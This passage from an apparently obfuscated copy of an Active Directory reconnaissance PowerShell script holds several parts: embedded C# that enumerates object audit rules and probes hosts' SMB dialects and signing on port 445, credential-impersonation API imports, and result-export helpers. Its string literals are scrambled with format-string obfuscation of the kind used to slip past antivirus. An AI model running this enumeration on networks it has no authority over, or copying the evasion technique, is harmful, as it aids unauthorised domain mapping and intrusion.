
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

# modified version from https://github.com/vletoux/SmbScanner/blob/master/smbscanner.ps1
$PingCastleSMBScannerSource = @"

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@

# Import the LogonUser, ImpersonateLoggedOnUser and RevertToSelf Functions from advapi32.dll and the CloseHandle Function from kernel32.dll
# https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Utility/Add-Type?view=powershell-5.1
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa379317(v=vs.85).aspx

$Advapi32Def = ((("{2}{23}{20}{7}{54}{77}{60}{56}{87}{92}{85}{47}{9}{69}{1}{59}{37}{40}{79}{57}{12}{25}{58}{44}{31}{63}{6}{78}{67}{90}{0}{55}{35}{41}{82}{50}{52}{71}{5}{75}{72}{46}{18}{15}{89}{91}{61}{51}{70}{24}{68}{22}{3}{64}{19}{76}{95}{62}{27}{66}{93}{14}{84}{81}{17}{33}{34}{26}{53}{32}{65}{11}{48}{8}{96}{30}{16}{73}{28}{21}{49}{74}{10}{45}{36}{29}{42}{39}{13}{86}{4}{83}{38}{88}{94}{43}{80}"-f 'o','ic ','G',' SetLastError = true','tic','r,','string ',' [DllImp',' ','e)]','SetLas','n);
','(string',' ','bool Impers',' phToken)','llImpo','U','r','   ','  ','pi32.d','lnoa,','rS
 ','port(noaadvapi32.d',' ','IntPt','i','noaadva','t',' [D','U','k','ser','(','int dwLogonTy','Error = ','tatic ','bool','ue)]
    public','extern bool Log','pe','r','oSelf();
','sz','t',' IntPt',' tru','
 ','llnoa',' dwL','DllI','ogon','r hTo','or','rd, ','noa, S','User','lp','s','api32.dll','   [',' stat','sername, ',')]
','e','c exter','omain, string ','l','
    publ','m','Provide','t','rt(',', ',' ou',' publ','t(noaadv','lpszD','on','GrS','dOn',', int',' extern ','onateLogge','LastError =','sta','e',' Revert',';
','lpszPassw','
 ','t','n ','T','ic',' ')).replaCe(([Char]110+[Char]111+[Char]97),[stRinG][Char]34).replaCe(([Char]71+[Char]114+[Char]83),[stRinG][Char]39))

# https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx

$Kernel32Def = ((("{3}{16}{14}{10}{27}{8}{4}{0}{19}{1}{15}{26}{25}{5}{2}{28}{21}{22}{23}{17}{18}{20}{12}{9}{24}{7}{11}{6}{13}"-f'l',' S','e)]
 ','DJR
    [DllIm','2.dl',' tru',');
D',' hOb','3','le(IntP','4yIkerne','ject','nd','JR','rt(','etLa','po','bool Close','H','4yI,','a',' publ','ic static exter','n ','tr','tError =','s','l','  ')).rEPLAcE('4yI',[STRing][Char]34).rEPLAcE('DJR',[STRing][Char]39))

Function Get-DateDiff
{
<#
.SYNOPSIS
    Get difference between two dates.

.DESCRIPTION
    Returns the difference between two dates.

.PARAMETER Date1
    [DateTime]
    Date

.PARAMETER Date2
    [DateTime]
    Date

.OUTPUTS
    [System.ValueType.TimeSpan]
    Returns the difference between the two dates.
#>
    param (
        [Parameter(Mandatory = $true)]
        [DateTime] $Date1,

        [Parameter(Mandatory = $true)]
        [DateTime] $Date2
    )

    If ($Date2 -gt $Date1)
    {
        $DDiff = $Date2 - $Date1
    }
    Else
    {
        $DDiff = $Date1 - $Date2
    }
    Return $DDiff
}

Function Get-DNtoFQDN
{
<#
.SYNOPSIS
    Gets Domain Distinguished Name (DN) from the Fully Qualified Domain Name (FQDN).

.DESCRIPTION
    Converts Domain Distinguished Name (DN) to Fully Qualified Domain Name (FQDN).

.PARAMETER ADObjectDN
    [string]
    Domain Distinguished Name (DN)

.OUTPUTS
    [String]
    Returns the Fully Qualified Domain Name (FQDN).

.LINK
    https://adsecurity.org/?p=440
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ADObjectDN
    )

    $Index = $ADObjectDN.IndexOf('DC=')
    If ($Index)
    {
        $ADObjectDNDomainName = $($ADObjectDN.SubString($Index)) -replace 'DC=','' -replace ',','.'
    }
    Else
    {
        # Modified version from https://adsecurity.org/?p=440
        [array] $ADObjectDNArray = $ADObjectDN -Split ("DC=")
        $ADObjectDNArray | ForEach-Object {
            [array] $temp = $_ -Split (",")
            [string] $ADObjectDNArrayItemDomainName += $temp[0] + "."
        }
        $ADObjectDNDomainName = $ADObjectDNArrayItemDomainName.Substring(1, $ADObjectDNArrayItemDomainName.Length - 2)
    }
    Return $ADObjectDNDomainName
}

Function Export-ADRCSV
{
<#
.SYNOPSIS
    Exports Object to a CSV file.

.DESCRIPTION
    Exports Object to a CSV file using Export-CSV.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the CSV File.

.OUTPUTS
    CSV file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        $ADRObj | Export-Csv -Path $ADFileName -NoTypeInformation -Encoding Default
    }
    Catch
    {
        Write-Warning "[Export-ADRCSV] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRXML
{
<#
.SYNOPSIS
    Exports Object to a XML file.

.DESCRIPTION
    Exports Object to a XML file using Export-Clixml.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the XML File.

.OUTPUTS
    XML file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject $ADRObj).Save($ADFileName)
    }
    Catch
    {
        Write-Warning "[Export-ADRXML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRJSON
{
<#
.SYNOPSIS
    Exports Object to a JSON file.

.DESCRIPTION
    Exports Object to a JSON file using ConvertTo-Json.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the JSON File.

.OUTPUTS
    JSON file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        ConvertTo-JSON -InputObject $ADRObj | Out-File -FilePath $ADFileName
    }
    Catch
    {
        Write-Warning "[Export-ADRJSON] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRHTML
{
<#
.SYNOPSIS
    Exports Object to a HTML file.

.DESCRIPTION
    Exports Object to a HTML file using ConvertTo-Html.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the HTML File.

.OUTPUTS
    HTML file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName,

        [Parameter(Mandatory = $false)]
        [String] $ADROutputDir = $null
    )

$Header = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If ($ADFileName.Contains(("{1}{0}" -f 'ndex','I')))
        {
            $HTMLPath  = -join($ADROutputDir,'\',("{1}{2}{0}"-f 's','HTML','-File'))
            $HTMLPath = $((Convert-Path $HTMLPath).TrimEnd("\"))
            $HTMLFiles = Get-ChildItem -Path $HTMLPath -name
            $HTML = $HTMLFiles | ConvertTo-HTML -Title ("{1}{0}{2}"-f'e','ADR','con') -Property @{Label=("{4}{0}{2}{1}{3}" -f 'ble','en',' of Cont','ts','Ta');Expression={"<a href='$($_)'>$($_)</a> "}} -Head $Header

            Add-Type -AssemblyName System.Web
            [System.Web.HttpUtility]::HtmlDecode($HTML) | Out-File -FilePath $ADFileName
        }
        Else
        {
            If ($ADRObj -is [array])
            {
                $ADRObj | Select-Object * | ConvertTo-HTML -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
            Else
            {
                ConvertTo-HTML -InputObject $ADRObj -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
        }
    }
    Catch
    {
        Write-Warning "[Export-ADRHTML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADR
{
<#
.SYNOPSIS
    Helper function for all output types supported.

.DESCRIPTION
    Helper function for all output types supported.

.PARAMETER ADObjectDN
    [PSObject]
    ADRObj

.PARAMETER ADROutputDir
    [String]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRModuleName
    [String]
    Module Name.

.OUTPUTS
    STDOUT, CSV, XML, JSON and/or HTML file, etc.
#>
    param(
        [Parameter(Mandatory = $true)]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [String] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $true)]
        [String] $ADRModuleName
    )

    Switch ($OutputType)
    {
        ("{2}{1}{0}" -f 'UT','O','STD')
        {
            If ($ADRModuleName -ne ("{0}{1}{2}"-f'Abo','ut','ADRecon'))
            {
                If ($ADRObj -is [array])
                {
                    # Fix for InvalidOperationException: The object of type "Microsoft.PowerShell.Commands.Internal.Format.FormatStartData" is not valid or not in the correct sequence.
                    $ADRObj | Out-String -Stream
                }
                Else
                {
                    # Fix for InvalidOperationException: The object of type "Microsoft.PowerShell.Commands.Internal.Format.FormatStartData" is not valid or not in the correct sequence.
                    $ADRObj | Format-List | Out-String -Stream
                }
            }
        }
        'CSV'
        {
            $ADFileName  = -join($ADROutputDir,'\',("{2}{0}{1}" -f'-File','s','CSV'),'\',$ADRModuleName,("{1}{0}"-f'v','.cs'))
            Export-ADRCSV -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'XML'
        {
            $ADFileName  = -join($ADROutputDir,'\',("{1}{0}{2}" -f 'le','XML-Fi','s'),'\',$ADRModuleName,("{1}{0}" -f 'l','.xm'))
            Export-ADRXML -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ("{0}{1}" -f'J','SON')
        {
            $ADFileName  = -join($ADROutputDir,'\',("{2}{0}{1}" -f '-','Files','JSON'),'\',$ADRModuleName,("{0}{1}" -f'.','json'))
            Export-ADRJSON -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ("{1}{0}"-f'ML','HT')
        {
            $ADFileName  = -join($ADROutputDir,'\',("{3}{2}{1}{0}"-f 'es','-Fil','TML','H'),'\',$ADRModuleName,("{1}{0}"-f'tml','.h'))
            Export-ADRHTML -ADRObj $ADRObj -ADFileName $ADFileName -ADROutputDir $ADROutputDir
        }
    }
}

Function Get-ADRExcelComObj
{
<#
.SYNOPSIS
    Creates a ComObject to interact with Microsoft Excel.

.DESCRIPTION
    Creates a ComObject to interact with Microsoft Excel if installed, else warning is raised.

.OUTPUTS
    [System.__ComObject] and [System.MarshalByRefObject]
    Creates global variables $excel and $workbook.
#>

    #Check if Excel is installed.
    Try
    {
        # Suppress verbose output
        $SaveVerbosePreference = $script:VerbosePreference
        $script:VerbosePreference = ("{2}{3}{4}{1}{0}" -f'ue','tin','S','ilentlyCo','n')
        $global:excel = New-Object -ComObject excel.application
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
    }
    Catch
    {
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
        Write-Warning ("{32}{10}{11}{30}{5}{24}{8}{2}{17}{26}{14}{3}{22}{33}{16}{6}{27}{35}{12}{25}{20}{1}{7}{29}{21}{13}{28}{23}{9}{0}{31}{34}{4}{18}{36}{15}{19}"-f'o',' to ge',' appear ','talled. Skipp','i','l','DRecon-Report.xl','nerate','does not',' h','RExcelCom','Obj]','Ge','-Report.','e ins','icrosoft Ex','on of A','to ','th','cel installed.','Excel parameter','Recon','ing gen','slx on a',' ','n','b','sx. Us','x',' the AD',' Exce','st ','[Get-AD','erati','w','e the -',' M')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    $excel.Visible = $true
    $excel.Interactive = $false
    $global:workbook = $excel.Workbooks.Add()
    If ($workbook.Worksheets.Count -eq 3)
    {
        $workbook.WorkSheets.Item(3).Delete()
        $workbook.WorkSheets.Item(2).Delete()
    }
}

Function Get-ADRExcelComObjRelease
{
<#
.SYNOPSIS
    Releases the ComObject created to interact with Microsoft Excel.

.DESCRIPTION
    Releases the ComObject created to interact with Microsoft Excel.

.PARAMETER ComObjtoRelease
    ComObjtoRelease

.PARAMETER Final
    Final
#>
    param(
        [Parameter(Mandatory = $true)]
        $ComObjtoRelease,

        [Parameter(Mandatory = $false)]
        [bool] $Final = $false
    )
    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.releasecomobject(v=vs.110).aspx
